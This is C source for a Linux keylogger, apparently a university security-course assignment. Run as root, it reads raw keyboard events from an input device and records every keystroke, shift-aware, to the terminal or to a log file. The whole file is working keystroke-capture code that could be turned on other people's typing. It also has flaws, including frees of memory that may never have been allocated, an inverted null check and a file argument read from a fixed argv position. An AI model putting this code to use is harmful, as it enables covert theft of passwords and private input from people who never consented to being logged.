/*
 * Linux keylogger
 *
 * HY457
 * Assignment 3
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <linux/input.h>

#include <signal.h>

/* unknown keystroke */
#define UK "UNKNOWN"

/* change it with your keyboard device event number */
#define KEYBOARD "/dev/input/event5"

int l_shift_state = 0;
int r_shift_state = 0;

int l_alt_state   = 0;
int r_alt_state   = 0;

int l_ctrl_state  = 0;
int r_ctrl_state  = 0;

FILE *fp;
int to_stdout;


void standardPrintHandler(struct input_event event);


/*
 * normal keyboard keystrokes 
 */
const char *
keycodes[] = {
	"RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
	"-", "=", "BACKSPACE", "TAB", "q", "w", "e", "r", "t", "y", "u", "i",
	"o", "p", "[", "]", "ENTER", "L_CTRL", "a", "s", "d", "f", "g", "h",
	"j", "k", "l", ";", "'", "`", "L_SHIFT", "\\", "z", "x", "c", "v", "b",
	"n", "m", ",", ".", "/", "R_SHIFT", "*", "L_ALT", "SPACE", "CAPS_LOCK", 
	"F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUM_LOCK",
	"SCROLL_LOCK", "NL_7", "NL_8", "NL_9", "-", "NL_4", "NL5",
	"NL_6", "+", "NL_1", "NL_2", "NL_3", "INS", "DEL", UK, UK, UK,
	"F11", "F12", UK, UK,	UK, UK,	UK, UK, UK, "R_ENTER", "R_CTRL", "/", 
	"PRT_SCR", "R_ALT", UK, "HOME", "UP", "PAGE_UP", "LEFT", "RIGHT", "END", 
	"DOWN",	"PAGE_DOWN", "INSERT", "DELETE", UK, UK, UK, UK,UK, UK, UK, 
	"PAUSE"
};


/*
 * keyboard keystrokes when the right or left Shift key is pressed
 */
const char *
shifted_keycodes[] = {
	"RESERVED", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", 
	"_", "+", "BACKSPACE", "TAB", "Q", "W", "E", "R", "T", "Y", "U", "I", 
	"O", "P", "{", "}", "ENTER", "L_CTRL", "A", "S", "D", "F", "G", "H", 
	"J", "K", "L", ":", "\"", "~", "L_SHIFT", "|", "Z", "X", "C", "V", "B", 
	"N", "M", "<", ">", "?", "R_SHIFT", "*", "L_ALT", "SPACE", "CAPS_LOCK", 
	"F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUM_LOCK", 
	"SCROLL_LOCK", "HOME", "UP", "PGUP", "-", "LEFT", "NL_5", 
	"R_ARROW", "+", "END", "DOWN", "PGDN", "INS", "DEL", UK, UK, UK, 
	"F11", "F12", UK, UK,	UK, UK,	UK, UK, UK, "R_ENTER", "R_CTRL", "/", 
	"PRT_SCR", "R_ALT", UK, "HOME", "UP", "PAGE_UP", "LEFT", "RIGHT", "END", 
	"DOWN",	"PAGE_DOWN", "INSERT", "DELETE", UK, UK, UK, UK,UK, UK, UK, 
	"PAUSE"
};


/*
 * returns true when the keycode is a Shift (left or right)
 */
bool
isShift(int code)
{
	return ((code == KEY_LEFTSHIFT) || (code == KEY_RIGHTSHIFT));
}

/*
 * returns true when the keycode is a ALT (left or right)
 */
bool
isAlt(int code)
{
	return ((code == KEY_LEFTALT) || (code == KEY_RIGHTALT));
}


/*
 * returns true when the keycode is a Control (left or right)
 */
bool
isControl(int code)
{
	return ((code == KEY_LEFTCTRL) || (code == KEY_RIGHTCTRL));
}


/*
 * returns true when the keycode is Esc
 */
bool
isEsc(int code)
{
	return (code == KEY_ESC);
}


/*
 * checks if the user has root privileges
 */
bool
isRoot(void) {
	if (geteuid() != 0) {
		printf("\nMust run it as root, in order to have access "
		    "to the keyboard device\n");
		return false;
	}
	return true;	
}

/* handlers */

void shiftHandler(struct input_event event){
	
	if(event.code == KEY_LEFTSHIFT){
					if(event.value){
						if(l_shift_state == 0){
							// printf("\%s Key Pressed\n", keycodes[event.code]);
							l_shift_state = 1;
							standardPrintHandler(event);

						}
					}
					else{
						// printf("\%s Key Released\n", keycodes[event.code]);
						l_shift_state = 0;
						standardPrintHandler(event);

					}
				}
				else {
					if(event.value){
						if(r_shift_state == 0){
							// printf("\%s Key Pressed\n", keycodes[event.code]);
							r_shift_state = 1;
							standardPrintHandler(event);
						}
					}
					else{
						// printf("\%s Key Released\n", keycodes[event.code]);
						r_shift_state = 0;
						standardPrintHandler(event);
					}
				}

}

void controlHandler(struct input_event event){
	
	if(event.code == KEY_LEFTCTRL){
					if(event.value){
						if(l_ctrl_state == 0){
							// printf("\%s Key Pressed\n", keycodes[event.code]);
							l_ctrl_state = 1;
							standardPrintHandler(event);
						}
					}
					else{
						// printf("\%s Key Released\n", keycodes[event.code]);
						l_ctrl_state = 0;
						standardPrintHandler(event);
					}
				}
				else {
					if(event.value){
						if(r_ctrl_state == 0){
							// printf("\%s Key Pressed\n", keycodes[event.code]);
							r_ctrl_state = 1;
							standardPrintHandler(event);
						}
					}
					else{
						// printf("\%s Key Released\n", keycodes[event.code]);
						r_ctrl_state = 0;
						standardPrintHandler(event);
					}
				}
}

void altHandler(struct input_event event){
	
	if(event.code == KEY_LEFTALT){
		if(event.value){
			if(l_alt_state == 0){
				// printf("\%s Key Pressed\n", keycodes[event.code]);
				l_alt_state = 1;
				standardPrintHandler(event);
			}
		}
		else{
			// printf("\%s Key Released\n", keycodes[event.code]);
			l_alt_state = 0;
			standardPrintHandler(event);
		}
	}
	else {
		if(event.value){
			if(r_alt_state == 0){
				// printf("\%s Key Pressed\n", keycodes[event.code]);
				r_alt_state = 1;
				standardPrintHandler(event);
				
			}
		}
		else{
			// printf("\%s Key Released\n", keycodes[event.code]);
			r_alt_state = 0;
			standardPrintHandler(event);
		}
	}

}

/* mode 1 -> pressed, mode 2 -> released */
void standardPrintHandler(struct input_event event){
		unsigned char *message;
		if(to_stdout)
			if(event.value)
				printf("\%s Key Pressed \n",keycodes[event.code]);
			else
				printf("\%s Key Released\n", keycodes[event.code]);
		else{
			message = malloc(126);
			if(event.value)
				sprintf(message,"\%s Key Pressed \n",keycodes[event.code]);
			else
				sprintf(message,"\%s Key Released \n",keycodes[event.code]);
			fwrite(message, 1, strlen(message), fp);
		}
}

/*
 * prints the usage message
 */
void
usage(void)
{
	printf(
	    "\n"
	    "Usage:\n"
	    "     sudo ./keyloger [ -s | -f file] [-h]\n"
	    "\n"
	    "Options:\n"
	    "  -f    file    Path to the output file.\n"
	    "  -s            Print to to_stdout.\n"
	    "  -h            This help message.\n"
	);
	exit(EXIT_FAILURE);
}	


/*
 * The keylogger's core functionality
 * Takes as argument the keyboard file descriptor
 * You can add more arguments if needed
 */
void
keylogger(int keyboard)
{
	struct input_event event;
	unsigned char *message;

	while (1) {
		// read(...); /* read the data from the keyboard */
		/* Implement your keylogger, catch the input_events */
		static int counter = 0;
		read(keyboard, &event, sizeof(struct input_event));
	
		if(event.type == EV_KEY){
			if(isEsc(event.code)){
				if(to_stdout)
					printf("\%s Key Pressed, exiting...\n",shifted_keycodes[event.code]);
				else {
					message = malloc(126);
					sprintf(message,"\%s Key Pressed, exiting...\n",shifted_keycodes[event.code]);
					fwrite(message, 1, strlen(message), fp);
				}
				free(message);
				fclose(fp);
				exit(1);
			}
			if(isShift(event.code)){
				// shifthandler
				shiftHandler(event);
			}
			else if (isControl(event.code)){
				controlHandler(event);
			}
			else if(isAlt(event.code)){
				altHandler(event);
			}
			// control handler
			// alt handler
			else if ( event.value == 1){
				if(l_shift_state || r_shift_state)
					if(to_stdout)
						printf("\%s Key Pressed \n",shifted_keycodes[event.code]);
					else{
						message = malloc(126);
						sprintf(message,"\%s Key Pressed \n",shifted_keycodes[event.code]);
						fwrite(message, 1, strlen(message), fp);
					}
				else{
						if(event.code == 46){
							if( l_ctrl_state ){
								if(to_stdout)
									printf("L_CTRL + \%s Key Pressed concurrently, exiting..\n",keycodes[event.code]);
								else{
									message = malloc(126);
									sprintf(message, "L_CTRL + \%s Key Pressed concurrently, exiting..\n",keycodes[event.code]);
									fwrite(message, 1, strlen(message), fp);
								}
								free(message);
								fclose(fp);
								exit(0);
							}
							if( r_ctrl_state ){
								if(to_stdout)
									printf("R_CTRL + \%s Key Pressed concurrently, exiting..\n",keycodes[event.code]);
								else{
									message = malloc(126);
									sprintf(message, "R_CTRL + \%s Key Pressed concurrently, exiting..\n",keycodes[event.code]);
									fwrite(message, 1, strlen(message), fp);
								}
								free(message);
								fclose(fp);
								exit(0);
							}
						}
						if(to_stdout)
							printf("\%s Key Pressed\n",keycodes[event.code]);
						else {
								message = malloc(126);
								sprintf(message, "\%s Key Pressed\n",keycodes[event.code]);
								fwrite(message, 1, strlen(message), fp);
						}
					}
			}
			// else if ( event.value == 0){
			// 	if(l_shift_state || r_shift_state)
			// 		printf("\%s Key Released \n",shifted_keycodes[event.code]);
			// 	else
			// 		printf("\%s Key Released \n",keycodes[event.code]);
			// }
		}
	if(message == NULL)
		free(message);

	}

	return;
}


/*
 * main
 */
int
main(int argc, char *argv[])
{
	int opt;
	int root;
	int kb;
	char *output;

	/* init */
	to_stdout = 0;



	/* check root */
	root = isRoot();
	if (!root)
		usage();


	/* get options */
	while ((opt = getopt(argc, argv, "f:sh")) != -1) {
		switch (opt) {
		case 'f':
			output = strdup(optarg);
			if((fp = fopen(argv[2] ,"a")) < 0 ){
				printf("Error in opening file..");
				exit(EXIT_FAILURE);
			}

			break;
		case 's':
			to_stdout = 1;
			break;
		case 'h':
		default:
			usage();
		}
	}


	/* Keyboard file descriptor */
	if ((kb = open(KEYBOARD, O_RDONLY)) < 0) {
		printf("\nUnable to read from the device\n");
		exit(EXIT_FAILURE);
	}


	keylogger(kb);

	
	printf("\nKeylogger terminated.\n");
	

	/* Close the keyboard file descriptor */
	close(kb);


	return 0;
}
